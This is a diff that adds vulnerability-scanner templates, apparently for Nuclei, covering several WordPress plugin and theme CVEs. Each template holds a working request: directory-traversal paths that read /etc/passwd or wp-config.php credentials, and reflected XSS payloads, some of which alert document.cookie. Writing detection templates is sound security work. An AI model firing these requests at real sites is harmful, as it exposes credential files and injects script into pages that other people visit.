@@ -324,6 +324,40 @@
       ]
     },
     {
+      "id": "CVE-2011-1669",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in wp-download.php in the WP Custom Pages module 0.5.0.1 for WordPress allows remote attackers to read arbitrary files via ..%2F (encoded dot dot) sequences in the url parameter.",
+        "name": "WP Custom Pages 0.5.0.1 - Local File Inclusion (LFI)",
+        "reference": "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1669\n- https://www.exploit-db.com/exploits/17119\n",
+        "severity": "high",
+        "tags": "cve,cve2011,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2011-4618",
       "info": {
         "author": "daffainfo",
@@ -445,6 +479,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/adminimize/adminimize_page.php?page=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2011-5106",
+      "info": {
+        "author": "daffainfo",
+        "description": "Cross-site scripting (XSS) vulnerability in edit-post.php in the Flexible Custom Post Type plugin before 0.1.7 for WordPress allows remote attackers to inject arbitrary web script or HTML via the id parameter.",
+        "name": "WordPress Plugin Flexible Custom Post Type < 0.1.7 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2011-5106",
+        "severity": "medium",
+        "tags": "cve,cve2011,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -835,6 +911,90 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?page_id=2&%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-4273",
+      "info": {
+        "author": "daffainfo",
+        "description": "Cross-site scripting (XSS) vulnerability in libs/xing.php in the 2 Click Social Media Buttons plugin before 0.34 for WordPress allows remote attackers to inject arbitrary web script or HTML via the xing-url parameter.",
+        "name": "2 Click Socialmedia Buttons < 0.34 - Reflected Cross Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2012-4273",
+        "severity": "medium",
+        "tags": "cve,cve2012,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-4768",
+      "info": {
+        "author": "daffainfo",
+        "description": "Cross-site scripting (XSS) vulnerability in the Download Monitor plugin before 3.3.5.9 for WordPress allows remote attackers to inject arbitrary web script or HTML via the dlsearch parameter to the default URI.",
+        "name": "WordPress Plugin Download Monitor < 3.3.5.9 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2012-4768",
+        "severity": "medium",
+        "tags": "cve,cve2012,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?dlsearch=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1388,6 +1548,48 @@
       ]
     },
     {
+      "id": "CVE-2014-4513",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple cross-site scripting (XSS) vulnerabilities in server/offline.php in the ActiveHelper LiveHelp Live Chat plugin 3.1.0 and earlier for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) MESSAGE, (2) EMAIL, or (3) NAME parameter.",
+        "name": "ActiveHelper LiveHelp Server 3.1.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-4513",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%22%3E%3C/textarea%3E%3Cscript%3Ealert%28123%29%3C/script%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-6271",
       "info": {
         "author": "pentest_swissky",
@@ -1905,6 +2107,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-9480",
+      "info": {
+        "author": "daffainfo",
+        "name": "WordPress Plugin RobotCPA 5 - Directory Traversal",
+        "reference": "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9480\n- https://www.exploit-db.com/exploits/37252\n",
+        "severity": "high",
+        "tags": "cve,cve2015,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[0*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk"
           ]
         }
       ]
@@ -5608,6 +5844,39 @@
       ]
     },
     {
+      "id": "CVE-2018-9118",
+      "info": {
+        "author": "0x_Akoko",
+        "description": "Affected by this vulnerability is an unknown functionality of the file exports/download.php. The manipulation of the argument filename with the input value leads to a directory traversal vulnerability",
+        "name": "WP Background Takeover, Directory Traversal <= 4.1.4",
+        "reference": "https://www.exploit-db.com/exploits/44417",
+        "severity": "high",
+        "tags": "wordpress,wp-plugin,lfi,cve,cve2018"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD",
+                "DB_HOST",
+                "The base configurations of the WordPress"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-9995",
       "info": {
         "author": "princechaddha",
@@ -7136,6 +7405,48 @@
       ]
     },
     {
+      "id": "CVE-2019-19134",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Hero Maps Premium plugin 2.2.1 and prior for WordPress is prone to unauthenticated XSS via the views/dashboard/index.php p parameter because it fails to sufficiently sanitize user-supplied input    - https://wpscan.com/vulnerability/24b83ce5-e3b8-4262-b087-a2dfec014985",
+        "name": "Hero Maps Premium < 2.2.3 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://wpscan.com/vulnerability/d179f7fe-e3e7-44b3-9bf8-aab2e90dbe01",
+        "severity": "medium",
+        "tags": "cve,cve2019,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "foo\"><svg//onload=\"alert(123)\">"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3E%3Csvg//onload=%22alert(123)%22%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-19368",
       "info": {
         "author": "madrobot",
@@ -8250,6 +8561,40 @@
       ]
     },
     {
+      "id": "CVE-2019-9618",
+      "info": {
+        "author": "daffainfo",
+        "description": "The GraceMedia Media Player plugin 1.0 for WordPress allows Local File Inclusion via the cfg parameter.",
+        "name": "WordPress Plugin GraceMedia Media Player 1.0 - Local File Inclusion (LFI)",
+        "reference": "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618\n- https://seclists.org/fulldisclosure/2019/Mar/26\n",
+        "severity": "high",
+        "tags": "cve,cve2019,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-9670",
       "info": {
         "author": "ree4pwn",
@@ -8954,6 +9299,48 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/v2/api/product/manger/getInfo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-12054",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Catch Breadcrumb plugin before 1.5.4 for WordPress allows Reflected XSS via the s parameter (a search query).",
+        "name": "Catch Breadcrumb < 1.5.7 - Unauthenticated Reflected XSS",
+        "reference": "https://wpscan.com/vulnerability/30a83491-2f59-4c41-98bd-a9e6e5a609d4",
+        "severity": "medium",
+        "tags": "cve,cve2020,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(123);>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E"
           ]
         }
       ]
@@ -9936,6 +10323,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-17362",
+      "info": {
+        "author": "daffainfo",
+        "description": "search.php in the Nova Lite theme before 1.3.9 for WordPress allows Reflected XSS.",
+        "name": "Nova Lite < 1.3.9 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://wpscan.com/vulnerability/30a83491-2f59-4c41-98bd-a9e6e5a609d4",
+        "severity": "medium",
+        "tags": "cve,cve2020,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src onerror=alert(123)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?s=%3Cimg%20src%20onerror=alert(123)%3E"
           ]
         }
       ]
@@ -14094,6 +14523,48 @@
       ]
     },
     {
+      "id": "CVE-2021-24298",
+      "info": {
+        "author": "daffainfo",
+        "description": "The method and share GET parameters of the Giveaway pages were not sanitised, validated or escaped before being output back in the pages, thus leading to reflected XSS",
+        "name": "Simple Giveaways < 2.36.2 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24298",
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/giveaway/mygiveaways/?share=%3Cscript%3Ealert(123)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24316",
       "info": {
         "author": "0x_Akoko",
@@ -14138,6 +14609,90 @@
       ]
     },
     {
+      "id": "CVE-2021-24320",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Bello - Directory & Listing WordPress theme before 1.6.0 did not properly sanitise and escape its listing_list_view, bt_bb_listing_field_my_lat, bt_bb_listing_field_my_lng, bt_bb_listing_field_distance_value, bt_bb_listing_field_my_lat_default, bt_bb_listing_field_keyword, bt_bb_listing_field_location_autocomplete, bt_bb_listing_field_price_range_from and bt_bb_listing_field_price_range_to parameter in ints listing page, leading to reflected Cross-Site Scripting issues.",
+        "name": "Bello WordPress Theme < 1.6.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24320",
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=(alert)(123);>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/listing/?listing_list_view=standard13%22%3E%3Cimg%20src%3Dx%20onerror%3D%28alert%29%28123%29%3B%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24335",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Car Repair Services & Auto Mechanic WordPress theme before 4.0 did not properly sanitise its serviceestimatekey search parameter before outputting it back in the page, leading to a reflected Cross-Site Scripting issue",
+        "name": "Car Repair Services < 4.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24335",
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(123);>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/car1/estimateresult/result?s=&serviceestimatekey=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24387",
       "info": {
         "author": "suman_kar",
@@ -14169,6 +14724,48 @@
           "matchers-condition": "and",
           "raw": [
             "GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24389",
+      "info": {
+        "author": "daffainfo",
+        "description": "The WP Foodbakery WordPress plugin before 2.2, used in the FoodBakery WordPress theme before 2.2 did not properly sanitize the foodbakery_radius parameter before outputting it back in the response, leading to an unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability.",
+        "name": "FoodBakery < 2.2 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24389",
+        "severity": "medium",
+        "tags": "cve,cve2021,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>prompt(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3E%3Cscript%3Eprompt(123)%3C/script%3E"
           ]
         }
       ]
